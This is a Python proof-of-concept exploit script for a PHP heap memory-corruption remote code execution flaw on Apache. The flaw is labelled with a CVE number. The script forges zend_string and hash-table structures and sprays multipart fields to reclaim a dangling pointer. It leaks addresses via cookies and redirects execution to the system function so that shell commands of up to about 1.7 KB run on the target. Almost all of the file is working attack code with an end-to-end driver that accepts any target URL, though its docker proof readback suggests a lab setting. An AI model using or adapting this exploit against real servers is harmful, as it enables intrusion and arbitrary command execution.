#!/usr/bin/env python3
# INDEX: external-field carrier lifting command-length cap | fpm apache | calibrated cmdoff per body
"""External-field long-command carrier (CVE-2026-109619), lifting the inline
command-length cap of the forged-array RCE carrier.

Ported from kengwang/php2shell-exp's long-command delivery (exploits/def_rce.py,
CMDOFF path).

Inlining the command inside the 384-byte fake `ht` at S+0x98 caps it at
0x160-0x98 = 200 bytes. This carrier instead delivers the
command in a SEPARATE multipart field (`CMD`, ~3100 bytes, its own large alloc
with a deterministic landing) carrying an external fake IS_STRING zend_string,
and points the fake execute_data's arg1 (carrier offset E+0x50 = 0x70) at that
field instead of at S+0x80. The command region is then bounded only by the CMD
field (fake_off+0x18 .. field_end), i.e. up to ~1.7 KB.

The 384-byte carrier at S keeps the short-command layout so the dangling-pointer
reclaim is unaffected; two things change:
  1. carrier offset 0x70 (arg1 value) -> `cmd_addr` (external), and
  2. a large `CMD` field appended to the reclaim body carrying the fake
     zend_string + the long command.

`cmd_addr = main_chunk + CMDOFF`, where CMDOFF is the chunk-relative landing of
the CMD field's fake-string header. CMDOFF is groom-specific and must be
calibrated once per body layout.

Usage
-----
    # offline: just emit / inspect the carrier bytes (no network)
    python3 -I poc/primitives/dispatch/longcmd_carrier.py --emit --cmd "$(cat payload.sh)"

    # end-to-end (needs a calibrated --cmdoff for this body):
    python3 -I poc/primitives/dispatch/longcmd_carrier.py http://127.0.0.1:8089 \
        --service apache-stock --cmdoff 0x<off> --shots 15 \
        --cmd 'long command up to ~1.7KB ...' --proof /tmp/pv

The carrier/field construction is checked offline (no target) by
verify_longcmd_carrier.py.
"""
import argparse
import importlib.util
import os
import struct
import sys
import time
import urllib.parse

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
from primitives.encode.zend_array_forge import forge_zend_array  # noqa: E402


def _load_apache_cookie_rce():
    # P bundles the disclose/forge bodies, transport, COOKIE_RCE_* constants,
    # WorkerPin and load_offsets this driver reuses.
    path = os.path.join(_POC_ROOT, "chains", "apache_cookie_rce.py")
    spec = importlib.util.spec_from_file_location("apache_cookie_rce_mod", path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


# carrier geometry (mirrors kengwang's _fake_payload)
CARRIER_SIZE = 384          # keep the 384-byte bin so S lands exactly as before
ARG1_OFF = 0x70             # E+0x50: fake execute_data arg1 value slot
# Inside the CMD field the fake zend_string header sits at FAKE_OFF; the command
# bytes follow at FAKE_OFF+0x18.  The usable command region runs up to CMD_LIMIT.
FAKE_OFF = 0x100
CMD_LIMIT = 0x800           # kengwang's guard: FAKE_OFF+len(fake) must be < 0x800
CMD_FIELD_SIZE = 3100       # the separate CMD field size (own large alloc)
# Marker that calibration scans for (16 bytes, at CMD field offset 0).
CMD_MARKER = b"LONGCMDMARKER!!!"


def fake_string(cmd: bytes) -> bytes:
    """External fake zend_string: gc(rc=1, IS_STRING 0x106), h=0, len, data, NUL.
    Identical to kengwang def_rce.py's `fake` and to the stock carrier's inline
    zend_string header at 0x80."""
    return (struct.pack("<II", 1, 0x106) + struct.pack("<Q", 0) +
            struct.pack("<Q", len(cmd)) + cmd + b"\x00")


def ht_external(S: int, zif: int, cmd_addr: int, size: int = CARRIER_SIZE) -> bytes:
    """The 384-byte carrier at S, byte-identical to the stock carrier EXCEPT
    arg1 (offset 0x70) points at the *external* command address cmd_addr instead
    of the inline S+0x80.  No command bytes are stored inline."""
    # 0x20 is both HashTable.nTableSize and execute_data.opline (E=0x20); opline
    # is written 0 last, so the effective byte here stays 0, keeping the reclaim
    # layout byte-for-byte identical.
    return forge_zend_array(S, zif, b"", size=size, arg1_ptr=cmd_addr)


def cmd_field_value(cmd: bytes, size: int = CMD_FIELD_SIZE,
                    fake_off: int = FAKE_OFF, marker: bytes = CMD_MARKER) -> bytes:
    """The separate CMD field value: `size` filler bytes with the fake
    zend_string planted at `fake_off`, and `marker` at offset 0 so calibration
    can locate the field's landing in the request heap."""
    fake = fake_string(cmd)
    if fake_off + len(fake) > CMD_LIMIT:
        raise ValueError(
            f"command too long: fake_off({fake_off:#x})+{len(fake)} exceeds the "
            f"{CMD_LIMIT:#x} CMD window (max ~{CMD_LIMIT - fake_off - 0x19} bytes)")
    buf = bytearray(b"C" * size)
    buf[0:len(marker)] = marker
    buf[fake_off:fake_off + len(fake)] = fake
    return bytes(buf)


def max_cmd_len(fake_off: int = FAKE_OFF) -> int:
    """Largest command this carrier can deliver (header 0x18 + NUL)."""
    return CMD_LIMIT - fake_off - 0x18 - 1


def cmd_addr_for(main_chunk: int, cmdoff: int) -> int:
    """Absolute address of the external fake zend_string header."""
    return main_chunk + cmdoff


def fakeref_body_with_cmd(P, S: int, ht: bytes, cmd_val: bytes,
                          n1: int = 500, n2: int = 495, vl: int = 384,
                          sid: bytes = b"a" * 32, progress: bytes = b"k0") -> bytes:
    """Build the forged fake-reference reclaim body with a long command.

    Layout: n1 fake-ref spray fields, the `ht` field, sid/progress, n2 spray
    fields, plus one large `CMD` field at the tail carrying the long command.
    `P` supplies the multipart boundary / constants."""
    b = P.COOKIE_RCE_BOUNDARY
    base = P.forge_fire_body(S, ht, vl=vl, n1=n1, n2=n2, sid=sid,
                                 progress=progress)
    closing = b"--" + b + b"--\r\n"
    # The external long-command field, appended at the tail (own large alloc).
    cmd_part = (b"--" + b + b'\r\nContent-Disposition: form-data; name="CMD"'
                b"\r\n\r\n" + cmd_val + b"\r\n")
    return base[:-len(closing)] + cmd_part + closing


# end-to-end driver
def run_longcmd_chain(P, host, port, path, off, full_cmd, cmdoff, *,
                      service=None, shots=15, big=78, restart_each=True,
                      pin_workers=0, workers=3, timeout=120.0, proof=None,
                      marker_mode=False):
    """Drive the exploit with the external CMD field, swapping the reclaim body
    for fakeref_body_with_cmd and the carrier for ht_external(arg1 ->
    main+cmdoff).  Returns a dict on success, else None."""
    import socket
    import subprocess

    def exec_in(svc_cmd):
        return subprocess.run(["docker", "compose", "exec", "-T", service] + svc_cmd,
                              capture_output=True)

    if service and proof:
        exec_in(["rm", "-f", proof])

    pin = P.WorkerPin(host, port, pin_workers) if pin_workers > 0 else None
    holders = []

    try:
        for shot in range(1, shots + 1):
            if service and restart_each:
                P.close_holders(holders)
                if pin:
                    pin.release()
                P.compose_restart(service)
            if pin:
                pin.pin_one_free()
            elif service and restart_each:
                holders.extend(P.hold_workers(host, port, workers))
            elif shot == 1 and not holders:
                holders.extend(P.hold_workers(host, port, workers))
            try:
                w = socket.create_connection((host, port), timeout=5)
                w.sendall(b"GET " + path.encode() + b" HTTP/1.0\r\nHost: x\r\n\r\n")
                w.recv(1024)
                w.close()
            except OSError:
                pass

            print(f"[longcmd_carrier][shot {shot}/{shots}] disclose_arm (big={big})")
            P.send_multipart_chunked(host, port, path + P.COOKIE_RCE_QUERY,
                                  P.disclose_arm_body(big), 180)
            time.sleep(0.2)
            resp = P.send_multipart_chunked(host, port, path,
                                         P.disclose_read_body(), timeout)
            try:
                info = P.parse_cookie_rce_leak(resp, off)
            except ValueError:
                print("[longcmd_carrier]   disclose_read miss (no cookie / clean); next shot")
                continue
            cands = info["main_candidates"]
            delta = info["lib"] - cands[0] if cands else 0
            if not cands or not (P.COOKIE_RCE_DELTA_MIN <= delta <= P.COOKIE_RCE_DELTA_MAX):
                print(f"[longcmd_carrier]   implausible delta {delta:#x}; next shot")
                continue
            zif = info["lib"] + off["zif_system"]
            for cand in cands:
                S = cand + P.COOKIE_RCE_S_OFF
                cmd_addr = cmd_addr_for(cand, cmdoff)
                print(f"[longcmd_carrier][shot {shot}] forge_arm+forge_fire main={cand:#x} S={S:#x} "
                      f"cmd_addr={cmd_addr:#x} zif={zif:#x}")
                P.send_multipart_plain(host, port, path, P.forge_arm_body(), timeout)
                time.sleep(0.2)
                ht = ht_external(S, zif, cmd_addr)
                cmd_val = cmd_field_value(full_cmd)
                P.send_multipart_plain(host, port, path,
                                    fakeref_body_with_cmd(P, S, ht, cmd_val),
                                    timeout)
                time.sleep(0.6)
                if not (service and proof):
                    continue
                r = exec_in(["cat", proof])
                if r.returncode == 0 and r.stdout.strip():
                    print(f"[longcmd_carrier] RCE OK (shot {shot}); {proof}:")
                    print(r.stdout.decode("utf-8", "replace").strip())
                    return {"lib": info["lib"], "main": cand, "S": S,
                            "cmd_addr": cmd_addr, "shot": shot, "proof": r.stdout}
                exec_in(["rm", "-f", proof])
        print("[longcmd_carrier] no shot landed the long command")
        return None
    finally:
        P.close_holders(holders)
        if pin:
            pin.release()


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url", nargs="?", help="target base URL, e.g. http://127.0.0.1:8089")
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--service", help="docker compose service (for proof readback)")
    ap.add_argument("--version", default="8.4.26")
    ap.add_argument("--sapi", default="apache")
    ap.add_argument("--cmd", default="id", help="shell command (up to ~1.7KB)")
    ap.add_argument("--proof", default="/tmp/longcmd_carrier.out")
    ap.add_argument("--cmdoff", type=lambda x: int(x, 0),
                    help="calibrated chunk-relative CMD landing offset (required "
                         "for end-to-end; see --calibrate)")
    ap.add_argument("--shots", type=int, default=15)
    ap.add_argument("--big", type=int, default=78)
    ap.add_argument("--workers", type=int, default=3)
    ap.add_argument("--pin-workers", type=int, default=0)
    ap.add_argument("--no-restart-each", action="store_true")
    ap.add_argument("--emit", action="store_true",
                    help="print carrier/field sizes + hex and exit (no network)")
    args = ap.parse_args()

    P = _load_apache_cookie_rce()
    full_cmd = f"{args.cmd} > {args.proof} 2>&1".encode()
    if len(full_cmd) > max_cmd_len():
        raise SystemExit(f"[longcmd_carrier] command too long ({len(full_cmd)} bytes); "
                         f"this carrier allows up to {max_cmd_len()} bytes")

    if args.emit or not args.url:
        # offline demonstration of the carrier bytes
        demo_S, demo_zif = 0x7f0000abc000, 0x7f0000def000
        demo_cmd_addr = 0x7f0000111100
        ht = ht_external(demo_S, demo_zif, demo_cmd_addr)
        cv = cmd_field_value(full_cmd)
        a1 = struct.unpack_from("<Q", ht, ARG1_OFF)[0]
        print(f"[longcmd_carrier] carrier={len(ht)}B  CMD field={len(cv)}B  "
              f"cmd={len(full_cmd)}B  max={max_cmd_len()}B")
        print(f"[longcmd_carrier] carrier arg1(0x70) = {a1:#x} (external)  "
              f"inline command bytes in carrier: 0 (externalised)")
        print(f"[longcmd_carrier] fake zend_string in CMD field at +{FAKE_OFF:#x}: "
              f"{cv[FAKE_OFF:FAKE_OFF+24].hex()} ...")
        if not args.url:
            print("[longcmd_carrier] (no URL given; offline emit only)")
            return

    if args.cmdoff is None:
        raise SystemExit("[longcmd_carrier] --cmdoff is required for an end-to-end run "
                         "(calibrate the CMD landing once; see "
                         "verify_longcmd_carrier.py). Use --emit for an offline "
                         "carrier dump.")

    u = urllib.parse.urlsplit(args.url if "://" in args.url else "http://" + args.url)
    host, port = u.hostname or "127.0.0.1", u.port or 80
    off = P.load_offsets(args.version, args.sapi)
    res = run_longcmd_chain(P, host, port, args.path, off, full_cmd, args.cmdoff,
                            service=args.service, shots=args.shots, big=args.big,
                            restart_each=not args.no_restart_each,
                            pin_workers=args.pin_workers, workers=args.workers,
                            proof=args.proof)
    raise SystemExit(0 if res else 1)


if __name__ == "__main__":
    main()
